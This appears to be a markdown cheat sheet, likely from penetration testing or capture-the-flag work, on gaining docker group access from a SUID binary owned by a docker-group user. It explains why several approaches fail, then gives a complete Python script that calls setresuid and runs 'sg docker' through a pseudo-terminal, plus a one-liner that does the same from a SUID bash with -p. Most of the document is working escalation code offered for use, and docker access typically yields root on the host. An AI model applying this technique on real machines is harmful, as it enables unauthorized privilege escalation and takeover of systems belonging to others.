# SUID + sg + Docker Escalation Pattern

## The Problem

You have a SUID binary owned by user `X` (euid=X). User X is in the `docker` group in `/etc/group`, but the SUID process's supplementary groups only show the original caller's groups. You need docker access.

## Why Common Approaches Fail

| Approach | Why It Fails |
|----------|-------------|
| `setgroups([docker_gid])` | Requires `CAP_SETGID` capability — SUID doesn't grant this |
| `initgroups("X", gid)` | Requires euid==0 or euid==target_uid AND ruid==target_uid. SUID sets euid but not ruid. |
| `sg docker -c "cmd"` from SUID process | sg reads /etc/group but the kernel checks the calling process's real GID/permissions. Without ruid==X, sg prompts for password. |
| Docker socket direct access | Socket is `root:docker` 0660 — kernel checks supplementary groups, not /etc/group |

## The Working Solution

1. **Set ruid to match target user** using `setresuid(target, target, target)`
2. **Run `sg docker -c "command"`** — sg now succeeds because ruid==target and target is in docker group

### Full Python Implementation

```python
import pty, os, select, ctypes

libc = ctypes.CDLL('libc.so.6', use_errno=True)

# Step 1: Set real UID to match the target user
# The SUID binary gives us euid=target, but ruid is still the original user
ret = libc.setresuid(1000, 1000, 1000)  # (ruid, euid, suid)
if ret != 0:
    print(f'setresuid failed: {ctypes.get_errno()}')
    exit(1)

# Step 2: Use PTY to run sg docker -c "command"
# sg requires a TTY, so we need pty.openpty()
master, slave = pty.openpty()
pid = os.fork()

if pid == 0:
    os.close(master)
    os.setsid()
    sf = os.open(os.ttyname(slave), os.O_RDWR)
    os.dup2(sf, 0)
    os.dup2(sf, 1)
    os.dup2(sf, 2)
    if sf > 2:
        os.close(sf)
    os.close(slave)
    
    os.environ['HOME'] = f'/home/target_user'
    os.environ['TERM'] = 'xterm'
    
    # sg docker -c "command"
    os.execve('/usr/bin/sg', ['sg', 'docker', '-c', 'docker ps'], os.environ)

os.close(slave)
out = b''
while True:
    r, _, _ = select.select([master], [], [], 10)
    if r:
        try:
            d = os.read(master, 8192)
            if not d:
                break
            out += d
        except:
            break
    else:
        break

os.waitpid(pid, 0)
print(out.decode(errors='replace'))
```

### Alternative: SUID Bash -p Flag

If the SUID binary is bash (or you can make it bash):

```bash
# bash -p preserves the SUID effective UID
/usr/bin/alpine -p -c "python3 -c 'import ctypes; libc=ctypes.CDLL(\"libc.so.6\"); libc.setresuid(1000,1000,1000); import os; os.execve(\"/usr/bin/sg\", [\"sg\",\"docker\",\"-c\",\"docker ps\"], os.environ)'"
```

## When This Works

- You have a SUID binary owned by user X
- User X is in a privileged group (docker, lxd, etc.) per /etc/group
- You can run Python or have access to `setresuid`
- The target group doesn't require a password for `sg` (docker usually doesn't)

## When This Doesn't Work

- No SUID binary available
- SUID binary is owned by root but target user is in the group (setresuid to root doesn't help)
- `sg` requires a password for the group (some groups are password-protected)
- Docker socket has additional restrictions (AppArmor, seccomp)
